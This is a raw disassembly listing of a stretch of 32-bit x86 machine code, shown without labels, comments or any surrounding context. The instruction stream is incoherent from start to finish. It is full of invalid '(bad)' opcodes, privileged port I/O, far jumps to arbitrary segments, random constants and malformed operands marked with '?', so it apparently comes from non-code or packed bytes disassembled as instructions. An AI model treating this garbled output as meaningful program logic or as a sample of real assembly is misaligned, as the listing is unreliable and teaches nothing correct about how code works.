  41367e:	and    BYTE PTR [edi],cl
  413680:	out    0x38,al
  413682:	pop    ebp
  413683:	mov    esp,0xc2473f8f
  413688:	rcl    BYTE PTR [ebx],0x62
  41368b:	popf   
  41368c:	and    ebx,ebp
  41368e:	arpl   WORD PTR ds:0xccec3975,ax
  413694:	stc    
  413695:	aam    0x98
  413697:	push   ebx
  413698:	mov    ebp,0xa0bcd532
  41369d:	dec    edx
  41369e:	aam    0xf0
  4136a0:	sub    ch,BYTE PTR [ecx-0x39]
  4136a3:	aad    0x17
  4136a5:	dec    esi
  4136a6:	cmp    al,0xbf
  4136a8:	rcl    BYTE PTR [ebx+0x33599d86],cl
  4136ae:	push   0x20d8e396
  4136b3:	aad    0x48
  4136b5:	jecxz  0x41367e
  4136b7:	push   esp
  4136b8:	inc    ecx
  4136b9:	lea    esp,[edx]
  4136bb:	jae    0x41370e
  4136bd:	inc    edi
  4136be:	mov    ebx,0x79299c2f
  4136c3:	dec    edi
  4136c4:	retf   
  4136c5:	pop    eax
  4136c6:	mov    esp,DWORD PTR [ebp-0x55]
  4136c9:	mov    bl,0xf5
  4136cb:	pop    ecx
  4136cc:	rol    bl,0x10
  4136cf:	imul   ecx,ebx,0xfffffff9
  4136d2:	rcl    DWORD PTR [edx+0x6a],1
  4136d5:	jp     0x413709
  4136d7:	push   es
  4136d8:	cdq    
  4136d9:	push   edx
  4136da:	aas    
  4136db:	nop
  4136dc:	xor    eax,0x126c6014
  4136e1:	sub    eax,0x1a35116b
  4136e6:	clc    
  4136e7:	adc    dl,BYTE PTR [edi]
  4136e9:	sbb    DWORD PTR [eax+0xdd7b974],edx
  4136ef:	jmp    0x70ea3205
  4136f4:	cmp    al,0xe4
  4136f6:	jbe    0x413679
  4136f8:	into   
  4136f9:	mov    esi,0x62453d23
  4136fe:	push   edi
  4136ff:	call   0x4ff196c0
  413704:	mov    edi,0x4c508422
  413709:	and    BYTE PTR [esp+ecx*8+0x77],ch
  41370d:	dec    ebx
  41370e:	test   BYTE PTR [eax],ah
  413710:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413711:	or     DWORD PTR [ebx-0x43f95ac8],edi
  413717:	bound  edx,QWORD PTR [ecx+0x43ef8f41]
  41371d:	inc    esi
  41371e:	jl     0x4136ab
  413720:	xchg   esi,eax
  413721:	nop
  413722:	pop    edi
  413723:	shl    DWORD PTR [ecx-0x23],1
  413726:	cs retf 
  413728:	mov    ds:0x4bd4784c,eax
  41372d:	or     ebx,0xffffffdc
  413730:	aam    0x2
  413732:	push   ds
  413733:	out    dx,eax
  413734:	mov    bh,0x3f
  413736:	mov    edx,0xcaf40e5b
  41373b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41373c:	lahf   
  41373d:	outs   dx,DWORD PTR ds:[esi]
  41373e:	outs   dx,BYTE PTR ds:[esi]
  41373f:	sub    BYTE PTR ds:0xa3c0fa50,ah
  413745:	pop    ds
  413746:	push   esi
  413747:	xchg   ecx,eax
  413748:	std    
  413749:	push   es
  41374a:	into   
  41374b:	mov    ds:0xbcd8237,al
  413750:	aaa    
  413751:	xor    eax,0x3c97f693
  413756:	rol    BYTE PTR [ebx-0x58],cl
  413759:	add    al,0x9d
  41375b:	pop    ecx
  41375c:	aam    0xf0
  41375e:	test   eax,0x63d7fe16
  413763:	pop    ecx
  413764:	loopne 0x4137c5
  413766:	fidiv  DWORD PTR [edx]
  413768:	jb     0x4137aa
  41376a:	rol    BYTE PTR [edx],cl
  41376c:	push   ecx
  41376d:	sub    eax,0x7b3d3452
  413772:	pop    ebp
  413773:	cmp    BYTE PTR [edx+0x5d],0x17
  413777:	mov    eax,0xba096e58
  41377c:	clc    
  41377d:	mov    ebp,0xbab9ef04
  413782:	jge    0x41378e
  413784:	xchg   ebp,eax
  413785:	mov    ds:0xd5e15bec,eax
  41378a:	mov    al,ds:0x23fb7039
  41378f:	push   esp
  413790:	xchg   edx,eax
  413791:	aaa    
  413792:	mov    es,WORD PTR [esi+0x437865c6]
  413798:	lea    esp,es:[esi+0x3d]
  41379c:	add    BYTE PTR ds:0xd0dc9d5b,bl
  4137a2:	and    al,0xbe
  4137a4:	inc    esp
  4137a5:	mov    al,BYTE PTR [ebx+ecx*8-0x3]
  4137a9:	jp     0x4137b4
  4137ab:	test   eax,0x1312e030
  4137b0:	add    ch,ch
  4137b2:	out    0xa0,eax
  4137b4:	xchg   ebp,eax
  4137b5:	fiadd  DWORD PTR [edx-0x6525ef44]
  4137bb:	and    al,BYTE PTR [ebp+ecx*8-0x6b]
  4137bf:	jge    0x4137e3
  4137c1:	data16 mov ds:0xd966522b,al
  4137c7:	ds jnp 0x413804
  4137ca:	rcl    BYTE PTR [eax],cl
  4137cc:	popf   
  4137cd:	mov    bh,bl
  4137cf:	cmc    
  4137d0:	fs int3 
  4137d2:	dec    esp
  4137d3:	mov    dh,0x5d
  4137d5:	and    al,BYTE PTR [ecx+0xc2a7479]
  4137db:	add    eax,0x233610eb
  4137e0:	jmp    0xd371:0xeed2c536
  4137e7:	sbb    eax,0xeab6275e
  4137ec:	(bad)  
  4137ed:	mov    ds:0x2fc786d7,al
  4137f2:	call   0x5367:0xdae6f087
  4137f9:	std    
  4137fa:	pop    esp
  4137fb:	push   eax
  4137fc:	inc    ecx
  4137fd:	lock mov edx,0xc99a5c6a
  413803:	mov    dl,0xa3
  413805:	and    DWORD PTR [ebx+0x244c3b8c],ebx
  41380b:	in     eax,dx
  41380c:	ror    DWORD PTR [ebx],1
  41380e:	push   ds
  41380f:	or     bh,BYTE PTR [edi+0x55]
  413812:	repz mov cl,dh
  413815:	in     eax,dx
  413816:	(bad)  
  413817:	into   
  413818:	bound  esi,QWORD PTR [ebp+0x3f5ed98b]
  41381e:	or     cl,BYTE PTR [esi]
  413820:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413821:	lods   al,BYTE PTR ds:[esi]
  413822:	xchg   edi,eax
  413823:	xchg   esp,eax
  413824:	xor    BYTE PTR [edx+0xee05b07],dh
  41382a:	pop    ss
  41382b:	mov    esi,0x55845349
  413830:	pushf  
  413831:	jns    0x413832
  413833:	jae    0x413854
  413835:	fwait
  413836:	cmp    al,0x32
  413838:	push   ds
  413839:	sub    eax,0x5b529696
  41383e:	(bad)  
  41383f:	push   edi
  413840:	mov    bl,0x8e
  413842:	retf   
  413843:	cdq    
  413844:	pop    esi
  413845:	jmp    0xf608:0x650b4f61
  41384c:	fdivr  st(7),st
  41384e:	xchg   esi,eax
  41384f:	(bad)  
  413850:	sub    BYTE PTR [edi],bh
  413852:	aas    
  413853:	popa   
  413854:	test   al,0x86
  413856:	mov    ds:0x5c66a6cc,al
  41385b:	cmp    bh,BYTE PTR [edx+0x5318240e]
  413861:	add    cl,ah
  413863:	fs clc 
  413865:	xchg   edi,eax
  413866:	pop    edi
  413867:	retf   
  413868:	mov    ebp,0xbdd76467
  41386d:	sub    DWORD PTR [eax+0x50],eax
  413870:	sub    esp,ebx
  413872:	retf   
  413873:	inc    esi
  413874:	xchg   edx,eax
  413875:	call   0xb918:0xdd61645b
  41387c:	lahf   
  41387d:	xor    cl,BYTE PTR [esi+0x5a2271a6]
  413883:	arpl   WORD PTR [eax+eiz*1+0x3e],di
  413887:	sbb    al,0x78
  413889:	jle    0x41388b
  41388b:	adc    ch,ah
  41388d:	(bad)  
  41388e:	lock cmp eax,0x256f9721
  413894:	in     al,dx
  413895:	ror    DWORD PTR [edx+edi*1],cl
  413898:	ret    0xf93e
  41389b:	jmp    0x41389b
  41389d:	sub    BYTE PTR [edi-0x22],ch
  4138a0:	cdq    
  4138a1:	out    dx,al
  4138a2:	xlat   BYTE PTR ds:[ebx]
  4138a3:	lock rcl DWORD PTR [edi+0x17c4ba08],cl
  4138aa:	mov    ch,0xc5
  4138ac:	ret    0x49a5
  4138af:	rcr    ah,1
  4138b1:	dec    ebp
  4138b2:	repnz fnstsw WORD PTR [ebp-0x22]
  4138b6:	pop    ebx
  4138b7:	adc    DWORD PTR cs:[ecx],ebx
  4138ba:	lock mov BYTE PTR [esi+0x44],bh
  4138be:	xlat   BYTE PTR ds:[ebx]
  4138bf:	sar    edx,1
  4138c1:	and    ecx,ebx
  4138c3:	imul   edx,DWORD PTR [edx-0x7bb34a07],0xffffffe3
  4138ca:	mov    esi,0x5cc0a984
  4138cf:	bound  ebx,QWORD PTR [esi+0x17]
  4138d2:	dec    ebx
  4138d3:	adc    BYTE PTR ds:0x2914315e,al
  4138d9:	pop    ebx
  4138da:	(bad)  
  4138db:	mov    bh,0x99
  4138dd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4138de:	aad    0xf2
  4138e0:	push   cs
  4138e1:	pop    esi
  4138e2:	test   al,0x77
  4138e4:	dec    edi
  4138e5:	pop    eax
  4138e6:	retf   
  4138e7:	add    BYTE PTR [esi+0x4995ab12],0x67
  4138ee:	loope  0x413921
  4138f0:	sbb    BYTE PTR [edx],0xf1
  4138f3:	inc    edi
  4138f4:	int    0xc6
  4138f6:	dec    ebx
  4138f7:	push   edx
  4138f8:	out    dx,al
  4138f9:	ja     0x41395b
  4138fb:	stos   DWORD PTR es:[edi],eax
  4138fc:	in     al,dx
  4138fd:	js     0x413907
  4138ff:	mov    ecx,0x62123418
  413904:	xor    eax,0x5b7ab9c
  413909:	cmp    cl,BYTE PTR [esi]
  41390b:	xor    bh,bh
  41390d:	imul   ebp,DWORD PTR [eax-0x28],0xceca01e5
  413914:	mov    dh,0x27
  413916:	loop   0x413927
  413918:	jnp    0x41393a
  41391a:	push   edi
  41391b:	inc    ebx
  41391c:	sbb    dh,BYTE PTR [eax-0x69]
  41391f:	mov    eax,edi
  413921:	jmp    0x413936
  413923:	popa   
  413924:	inc    esp
  413925:	pop    ds
  413926:	cwde   
  413927:	mov    cl,0xd2
  413929:	fucomi st,st(1)
  41392b:	or     bl,BYTE PTR [edi+0x7e]
  41392e:	cmp    ch,dh
  413930:	(bad)  
  413931:	lods   al,BYTE PTR ds:[esi]
  413932:	mov    dh,BYTE PTR [edi+0x7605a453]
  413938:	pushf  
  413939:	jo     0x4138ee
  41393b:	sbb    bh,BYTE PTR [ebx-0x1a7ee934]
  413941:	lahf   
  413942:	shr    DWORD PTR [edx+0x73],1
  413945:	adc    esi,DWORD PTR [edi+0x45]
  413948:	and    edx,DWORD PTR [ecx]
  41394a:	cmc    
  41394b:	jne    0x413951
  41394d:	push   0x2d
  41394f:	sub    ebx,DWORD PTR [ecx+0x2ba2163d]
  413955:	mov    al,cl
  413957:	je     0x41391a
  413959:	int3   
  41395a:	mov    BYTE PTR [edi-0x6e6ff2aa],ch
  413960:	sbb    eax,0x273b7fda
  413965:	jl     0x4139a7
  413967:	mov    esi,0xe85af9af
  41396c:	outs   dx,DWORD PTR ds:[esi]
  41396d:	aam    0xee
  41396f:	repnz cmp edx,0x6173b09b
  413976:	dec    edx
  413977:	and    BYTE PTR [edx+0x3a8460ab],cl
  41397d:	pop    es
  41397e:	sbb    ebx,DWORD PTR [edi-0x522a42cb]
  413984:	add    eax,0xa90370cf
  413989:	push   esp
  41398a:	or     eax,0x11191fec
  41398f:	fwait
  413990:	rcl    DWORD PTR [edx+0x80e9f2d],1
  413996:	adc    cl,BYTE PTR [edx-0x44dfd245]
  41399c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41399d:	cmp    eax,0xfeac3b8c
  4139a2:	fimul  DWORD PTR [edx+0x38]
  4139a5:	mov    DWORD PTR ds:0x3e0080f9,0x92a372fe
  4139af:	popf   
  4139b0:	retf   
  4139b1:	xchg   esp,eax
  4139b2:	sbb    DWORD PTR [eax-0x15],esi
  4139b5:	cwde   
  4139b6:	ret    
  4139b7:	mov    esp,0x850f3fc7
  4139bc:	mov    edx,0xf5d227c7
  4139c1:	xchg   DWORD PTR [ecx+0x38],esi
  4139c4:	ror    DWORD PTR [ebx+0x2c],cl
  4139c7:	jmp    0x3d42:0xb8d20f22
  4139ce:	xchg   esi,eax
  4139cf:	pusha  
  4139d0:	retf   
  4139d1:	sar    BYTE PTR ds:[ebx+0x222645f8],0xb4
  4139d9:	add    esi,esi
  4139db:	and    al,0x5d
  4139dd:	cmp    BYTE PTR [edi-0x32],0xad
  4139e1:	std    
  4139e2:	nop
  4139e3:	push   ecx
  4139e4:	loope  0x413a2a
  4139e6:	adc    DWORD PTR [eax+0x4b],ebx
  4139e9:	mov    esi,0x51e2653e
  4139ee:	loope  0x4139dc
  4139f0:	mov    esi,0x66058d67
  4139f5:	imul   eax,DWORD PTR [edx+0x0],0x506e9
  4139fc:	add    BYTE PTR [edi],bh
  4139fe:	(bad)
  413a01:	(bad)  
  413a02:	aas    
  413a03:	(bad)
  413a06:	or     ecx,DWORD PTR [eax+0xc]
  413a09:	enter  0xb5ec,0xc4
  413a0d:	sbb    edi,DWORD PTR fs:[edi+0x78]
  413a11:	push   0x7c
  413a13:	js     0x413a8d
  413a15:	sub    cl,ch
  413a17:	inc    esi
  413a18:	out    dx,al
  413a19:	out    0x6f,eax
  413a1b:	pop    ecx
  413a1c:	ins    DWORD PTR es:[edi],dx
  413a1d:	gs lahf 
  413a1f:	push   edi
  413a20:	popa   
  413a21:	out    0x4b,al
  413a23:	and    BYTE PTR [ecx+0xd113ce4],0xb5
  413a2a:	xor    al,0xb7
  413a2c:	adc    eax,0xa2b77789
  413a31:	outs   dx,BYTE PTR ds:[esi]
  413a32:	sub    BYTE PTR [esi+0x209d7bce],dh
  413a38:	and    eax,0xaef77179
  413a3d:	sbb    eax,0x536416df
  413a42:	jb     0x413aa6
  413a44:	mov    DWORD PTR [ebx-0x4d],edi
  413a47:	enter  0x7417,0x41
  413a4b:	fwait
  413a4c:	mov    eax,ds:0x8e5873a3
  413a51:	mov    cl,0xc7
  413a53:	sar    DWORD PTR [edx+ebx*2],1
  413a56:	rcl    BYTE PTR [esi],cl
  413a58:	sub    al,0x6
  413a5a:	jo     0x413aae
  413a5c:	xchg   esp,eax
  413a5d:	push   ecx
  413a5e:	test   DWORD PTR [eax],esi
  413a60:	jp     0x413a7b
  413a62:	add    al,0xa2
  413a64:	xchg   ecx,eax
  413a65:	lds    eax,FWORD PTR [esi-0x38]
  413a68:	data16 add dl,BYTE PTR [edx]
  413a6b:	mov    DWORD PTR [ecx+0x5bae9fa6],edx
  413a71:	gs xchg esi,eax
  413a73:	push   0xa55a0887
  413a78:	mov    esi,0xc74b2bd6
  413a7d:	or     DWORD PTR [edi],0x2e
  413a80:	inc    esp
  413a81:	fdiv   DWORD PTR [esi+0x17]
  413a84:	fs int3 
  413a86:	mov    DWORD PTR [edx-0x69434b0],edi
  413a8c:	mov    edi,0x97f8e279
  413a91:	sbb    eax,0xdad4f058
  413a96:	lock xor ecx,DWORD PTR [si-0xc4f]
  413a9c:	hlt    
  413a9d:	pop    esp
  413a9e:	inc    ebx
  413a9f:	stos   BYTE PTR es:[edi],al
  413aa0:	fnstsw WORD PTR [esi-0x617a574e]
  413aa6:	fadd   QWORD PTR [ecx+0x30d2fb2e]
  413aac:	mov    bh,0xfd
  413aae:	cmc    
  413aaf:	retf   
  413ab0:	pop    ss
  413ab1:	nop
  413ab2:	mov    edi,0x359907c3
  413ab7:	aam    0x23
  413ab9:	jne    0x413a50
  413abb:	push   edi
  413abc:	push   es
  413abd:	mov    ch,0xf5
  413abf:	test   cl,ah
  413ac1:	mov    esi,DWORD PTR [eax+eiz*4+0x183ccd62]
  413ac8:	push   0x17
  413aca:	sub    ebx,edx
  413acc:	xchg   edi,eax
  413acd:	sbb    BYTE PTR [ecx+0x39],cl
  413ad0:	cmp    edx,DWORD PTR [eax-0x4bc5da29]
  413ad6:	xor    esp,esi
  413ad8:	aam    0xff
  413ada:	push   ss
  413adb:	popf   
  413adc:	bound  ebx,QWORD PTR [edi-0xa]
  413adf:	iret   
  413ae0:	inc    edx
  413ae1:	cwde   
  413ae2:	sbb    BYTE PTR ds:[ebp-0x1b],al
  413ae6:	push   ss
  413ae7:	jb     0x413b5b
  413ae9:	es mov ah,0x2b
  413aec:	or     DWORD PTR [ebp+0x64fe96dc],edx
  413af2:	xor    BYTE PTR [edi-0x7f464242],bl
  413af8:	test   eax,0x6435a19a
  413afd:	push   ds
  413afe:	mov    ch,0x93
  413b00:	lahf   
  413b01:	or     al,0x47
  413b03:	jae    0x413b6a
  413b05:	(bad)  
  413b06:	cwde   
  413b07:	inc    edi
  413b08:	and    al,0x7a
  413b0a:	xor    BYTE PTR [edi-0x75ad48c9],0xc4
  413b11:	pushf  
  413b12:	popa   
  413b13:	push   0xffffffb4
  413b15:	xchg   ebx,eax
  413b16:	sub    DWORD PTR [ebx],0x7c2b013f
  413b1c:	popa   
  413b1d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413b1e:	xchg   esi,eax
  413b1f:	stc    
  413b20:	hlt    
  413b21:	mov    ebp,0x69fa955b
  413b26:	ret    0xe1cc
  413b29:	xchg   ecx,eax
  413b2a:	add    BYTE PTR [esp+ebp*4+0x5c],ch
  413b2e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413b2f:	scas   eax,DWORD PTR es:[edi]
  413b30:	imul   edi,DWORD PTR [esi],0x51
  413b33:	cs pop esp
  413b35:	sar    BYTE PTR [eax],0xa9
  413b38:	mov    dl,0xc4
  413b3a:	pop    esi
  413b3b:	icebp  
  413b3c:	ins    BYTE PTR es:[edi],dx
  413b3d:	out    dx,al
  413b3e:	scas   eax,DWORD PTR es:[edi]
  413b3f:	mov    ah,0x79
  413b41:	(bad)  
  413b42:	pop    edi
  413b43:	adc    DWORD PTR [esp+ebp*2-0x2b],edx
  413b47:	jae    0x413adb
  413b49:	mov    ah,0xc4
  413b4b:	imul   ebx,DWORD PTR [edx-0x52cc0bb0],0x3eab7d37
  413b55:	xlat   BYTE PTR ds:[ebx]
  413b56:	cmp    DWORD PTR [edx+0x79e646d6],edx
  413b5c:	(bad)  
  413b5d:	mov    ds:0xaecb0cf7,al
  413b62:	loopne 0x413af3
  413b64:	int3   
  413b65:	cmp    dl,BYTE PTR [ebx+0x784ed60b]
  413b6b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413b6c:	test   eax,0xc6b62c93
  413b71:	out    dx,eax
  413b72:	stos   BYTE PTR es:[edi],al
  413b73:	push   esi
  413b74:	in     al,dx
  413b75:	aaa    
  413b76:	addr16 xchg esi,eax
  413b78:	lock mov ds:0x5ed89c73,eax
  413b7e:	inc    ebx
  413b7f:	jmp    0xfd9d:0xa125ae18
  413b86:	(bad)  
  413b87:	aas    
  413b88:	add    al,BYTE PTR [ebx]
  413b8a:	dec    esp
  413b8b:	sahf   
  413b8c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413b8d:	ss clc 
  413b8f:	jp     0x413b1f
  413b91:	and    eax,0xa39001a0
  413b96:	popa   
  413b97:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413b98:	jne    0x413bb7
  413b9a:	sbb    BYTE PTR [edx+0x7e],ah
  413b9d:	or     al,0xf5
  413b9f:	adc    al,0xc0
  413ba1:	in     eax,0x17
  413ba3:	pop    esi
  413ba4:	ret    
  413ba5:	push   es
  413ba6:	ds jo  0x413b5a
  413ba9:	lds    esp,FWORD PTR [ebp+0x7a]
  413bac:	dec    ebp
  413bad:	mov    WORD PTR [edx-0x60],ds
  413bb0:	pop    esp
  413bb1:	imul   ebp,DWORD PTR [ebp-0x894bffc],0xad94b8e6
  413bbb:	push   edx
  413bbc:	jmp    FWORD PTR [ebp+0x9]
  413bbf:	pop    edx
  413bc0:	out    dx,eax
  413bc1:	loop   0x413ba4
  413bc3:	stc    
  413bc4:	or     dl,BYTE PTR [ebp+0x27eee123]
  413bca:	mov    ebp,0x1ed8d3ff
  413bcf:	rol    DWORD PTR [eax],0xde
  413bd2:	mov    bh,0x87
  413bd4:	jnp    0x413bac
  413bd6:	inc    edi
  413bd7:	cdq    
  413bd8:	cmp    DWORD PTR [edi-0x54],esi
  413bdb:	popf   
  413bdc:	xchg   esi,eax
  413bdd:	mov    bl,0xe
  413bdf:	or     edi,esp
  413be1:	mov    ds:0x24ce0eae,al
  413be6:	mov    dl,bl
  413be8:	sub    al,0xd4
  413bea:	js     0x413bb0
  413bec:	or     BYTE PTR [edx+eiz*1-0x43],ch
  413bf0:	sti    
  413bf1:	mov    ds:0xdf192b9b,eax
  413bf6:	jae    0x413b78
  413bf8:	int    0xea
  413bfa:	xor    BYTE PTR [edi],dl
  413bfc:	daa    
  413bfd:	imul   esi,DWORD PTR [edx],0x14d32000
  413c03:	mov    ah,0xee
  413c05:	sub    DWORD PTR [edi-0x53c76349],ecx
  413c0b:	pop    ebx
  413c0c:	add    esp,DWORD PTR [edx+ecx*1-0x4c]
  413c10:	stc    
  413c11:	xchg   DWORD PTR [eax+0x608313fe],ecx
  413c17:	mov    ecx,0x60659f3f
  413c1c:	out    0xea,eax
  413c1e:	mov    eax,ds:0xa9286abf
  413c23:	sbb    DWORD PTR [ebp+0x7e3e961b],0xfffffff1
  413c2a:	cmp    BYTE PTR [eax+0x493675b5],0xa6
  413c31:	ins    DWORD PTR es:[edi],dx
  413c32:	lods   al,BYTE PTR ds:[esi]
  413c33:	stos   DWORD PTR es:[edi],eax
  413c34:	add    DWORD PTR [edi-0x70],edx
  413c37:	into   
  413c38:	out    0x75,al
  413c3a:	ret    0xc00f
  413c3d:	mov    ds:0x268794e2,eax
  413c42:	mov    dl,0xc1
  413c44:	push   edx
  413c45:	add    bl,bl
  413c47:	push   esp
  413c48:	or     ebp,ecx
  413c4a:	push   eax
  413c4b:	xor    ch,BYTE PTR [ecx+0x8de736a]
  413c51:	in     eax,0xba
  413c53:	imul   ebp,DWORD PTR [edx+eax*1-0x1fe0d8cc],0xffffffd8
  413c5b:	add    edx,DWORD PTR [ebx]
  413c5d:	mov    edi,0x12001454
  413c62:	aam    0x51
  413c64:	sub    cl,BYTE PTR [ebx]
  413c66:	cmp    al,0x18
  413c68:	imul   ah
  413c6a:	add    eax,0x41c7e442
  413c6f:	mov    dh,0x49
  413c71:	cmc    
  413c72:	lods   al,BYTE PTR ds:[esi]
  413c73:	nop
  413c74:	fisubr WORD PTR [esi+0x42]
  413c77:	ret    
  413c78:	xchg   esp,eax
  413c79:	inc    ebp
  413c7a:	jb     0x413c0c
  413c7c:	push   ds
  413c7d:	ret    0x5f79
  413c80:	(bad)  
  413c81:	xchg   ebp,eax
  413c82:	mov    eax,ds:0xdbe62f4f
  413c87:	fadd   QWORD PTR [edx-0x2a]
  413c8a:	mov    gs,WORD PTR [ebp-0x5d]
  413c8d:	sub    al,0xfa
  413c8f:	mov    cl,0x88
  413c91:	mov    ebp,0x4b197292
  413c96:	xchg   edi,eax
  413c97:	adc    al,0x7d
  413c99:	shl    BYTE PTR [ecx],1
  413c9b:	aaa    
  413c9c:	add    eax,0x1ab55e
  413ca1:	test   BYTE PTR [eax+0x5685880a],al
  413ca7:	out    dx,al
  413ca8:	mov    ?,WORD PTR [edx+ebx*4-0x1a]
  413cac:	mov    al,ds:0xef22b131
  413cb1:	ds aam 0xab
  413cb4:	std    
  413cb5:	mov    ds:0x402fb01d,eax
  413cba:	mov    ah,0x7a
  413cbc:	lods   al,BYTE PTR ds:[esi]
  413cbd:	pop    ebx
  413cbe:	inc    ebp
  413cbf:	and    ebp,ebx
  413cc1:	pusha  
  413cc2:	push   0x1aab8d12
  413cc7:	lods   al,BYTE PTR ds:[esi]
  413cc8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413cc9:	addr16 (bad) 
  413ccb:	jb     0x413c83
  413ccd:	aad    0x41
  413ccf:	jmp    0x5c73fbf
  413cd4:	retf   0x9949
  413cd7:	mul    DWORD PTR [ecx+0x363f906d]
  413cdd:	cmp    esp,0xc269f510
  413ce3:	dec    eax
  413ce4:	jnp    0x413cff
  413ce6:	rol    BYTE PTR [edi],1
  413ce8:	popa   
  413ce9:	mov    cl,0xaa
  413ceb:	mov    eax,ds:0xa54bd87b
  413cf0:	mov    es,WORD PTR [esi]
  413cf2:	cmp    BYTE PTR [ecx-0x7bef9f8],al
  413cf8:	(bad)  
  413cf9:	(bad)  
  413cfa:	sti    
  413cfb:	pop    es
  413cfc:	mov    bl,0x47
  413cfe:	lahf   
  413cff:	pop    ecx
  413d00:	fimul  WORD PTR [esi+0x35]
  413d03:	hlt    
  413d04:	pop    DWORD PTR [eax-0x7c7e2035]
  413d0a:	mov    eax,0x5d39abfe
  413d0f:	(bad)  
  413d10:	paddb  mm4,QWORD PTR [esi-0x1e]
  413d14:	mov    bh,0xb7
  413d16:	jp     0x413d3c
  413d18:	xchg   edx,eax
  413d19:	jle    0x413d53
  413d1b:	add    BYTE PTR [edx],dh
  413d1d:	fimul  WORD PTR [edi+0x5d]
  413d20:	sbb    eax,0x9ce9ea01
  413d25:	fdivr  QWORD PTR [edx]
  413d27:	cmp    al,0xc5
  413d29:	arpl   WORD PTR [eax+0x18],ax
  413d2c:	dec    ebp
  413d2d:	jns    0x413d3d
  413d2f:	mov    eax,0x94a11d05
  413d34:	ja     0x413ce3
  413d36:	mov    ecx,?
  413d38:	shr    al,1
  413d3a:	data16 sbb bh,BYTE PTR [eax+0x1f]
  413d3e:	adc    al,0xb0
  413d40:	out    dx,al
  413d41:	out    dx,eax
  413d42:	dec    ch
  413d44:	and    BYTE PTR [esi],cl
  413d46:	stos   DWORD PTR es:[edi],eax
  413d47:	mov    bl,0xcb
  413d49:	sub    dl,BYTE PTR [ebx-0x7df1f4e8]
  413d4f:	inc    ecx
  413d50:	mov    eax,ds:0xa3fd53f9
  413d55:	jbe    0x413d13
  413d57:	cmp    bl,BYTE PTR [eax]
  413d59:	inc    ebp
  413d5a:	xor    eax,0x5d2a5e14
  413d5f:	jg     0x413d40
  413d61:	mov    al,ds:0xb2768bb7
  413d66:	adc    DWORD PTR [edi-0x4b],esp
  413d69:	loopne 0x413cf7
  413d6b:	fidivr DWORD PTR ds:0x54baf47
  413d71:	repz repnz out 0x9e,eax
  413d75:	aad    0x88
  413d77:	and    DWORD PTR [eax],0x19
  413d7a:	adc    BYTE PTR [edi],al
  413d7c:	add    eax,0x563ecfa0
  413d81:	test   al,0xce
  413d83:	jns    0x413d76
  413d85:	ret    0xc36e
  413d88:	adc    BYTE PTR [ebp+0x79],ah
  413d8b:	add    al,0x4c
  413d8d:	call   0x6b80d0b8
  413d92:	push   0x42565f92
  413d97:	bound  ebp,QWORD PTR [eax+0x2c]
  413d9a:	dec    ebx
  413d9b:	add    al,0xa4
  413d9d:	imul   ecx,eax,0xffffffe2
  413da0:	adc    BYTE PTR [esi-0x1b],dl
  413da3:	ret    
  413da4:	addr16 js 0x413dc4
  413da7:	data16 ja 0x413dae
  413daa:	mov    edi,0x56b3bb90
  413daf:	fnsave [ecx+0x38727c6d]
  413db5:	sti    
  413db6:	(bad)  
  413db8:	das    
  413db9:	sub    ebx,esi
  413dbb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413dbc:	or     DWORD PTR [edx+0x2e09e1ed],ecx
  413dc2:	(bad)  
  413dc3:	stc    
  413dc4:	cmp    ebx,DWORD PTR [ebx+ebp*1+0xce8163f]
  413dcb:	adc    bl,BYTE PTR [edi+0x32]
  413dce:	push   esp
  413dcf:	fstp   TBYTE PTR [esi]
  413dd1:	into   
  413dd2:	add    edi,0xfffffffc
  413dd5:	adc    dl,BYTE PTR [edi+0x59e0da58]
  413ddb:	sti    
  413ddc:	dec    ebx
  413ddd:	mov    ebx,0x2792ec58
  413de2:	pop    es
  413de3:	dec    esi
  413de4:	and    BYTE PTR [esi+eax*4-0xb],0x13
  413de9:	pop    eax
  413dea:	lods   eax,DWORD PTR ds:[esi]
  413deb:	scas   eax,DWORD PTR es:[edi]
  413dec:	cli    
  413ded:	mov    ch,0x14
  413def:	or     ebx,esp
  413df1:	jmp    0xc112:0xde688a35
  413df8:	jns    0x413de0
  413dfa:	or     DWORD PTR [ebp+0x20],0xffffffaa
  413dfe:	adc    BYTE PTR [esi+0x4b],bl
  413e01:	fsub   DWORD PTR [esi+0x4a4226db]
  413e07:	pop    edi
  413e08:	and    BYTE PTR [ecx],al
  413e0a:	cs pop esp
  413e0c:	ins    BYTE PTR es:[edi],dx
  413e0d:	xor    eax,0x3437fe53
  413e12:	out    0xb4,al
  413e14:	adc    eax,0xac61b04c
  413e19:	mov    gs,WORD PTR [esi+0x1b]
  413e1c:	pusha  
  413e1d:	cmp    BYTE PTR [edx-0x51890aea],0xea
  413e24:	fcomp  QWORD PTR [esi+0x3d]
  413e27:	int    0x3f
  413e29:	imul   edx,DWORD PTR [ebx-0x78f6ceb7],0xffffff9d
  413e30:	add    eax,0xf00281df
  413e35:	inc    eax
  413e36:	sub    DWORD PTR [edx+0x19],ecx
  413e39:	inc    eax
  413e3a:	retf   
  413e3b:	test   DWORD PTR [ecx-0x61],0xbbb176c1
  413e42:	in     eax,0xfa
  413e44:	lahf   
  413e45:	outs   dx,DWORD PTR ds:[esi]
  413e46:	cmc    
  413e47:	pop    ecx
  413e48:	push   es
  413e49:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413e4a:	inc    edi
  413e4b:	lods   al,BYTE PTR ds:[esi]
  413e4c:	sbb    eax,0xb7791c45
  413e51:	aaa    
  413e52:	jmp    0xf09ac715
  413e57:	outs   dx,DWORD PTR ds:[esi]
  413e58:	mov    DWORD PTR [edx],edi
  413e5a:	leave  
  413e5b:	pushf  
  413e5c:	push   0xffffffed
  413e5e:	mov    ebx,0xc5203690
  413e63:	popf   
  413e64:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413e65:	(bad)  [ebx-0x5]
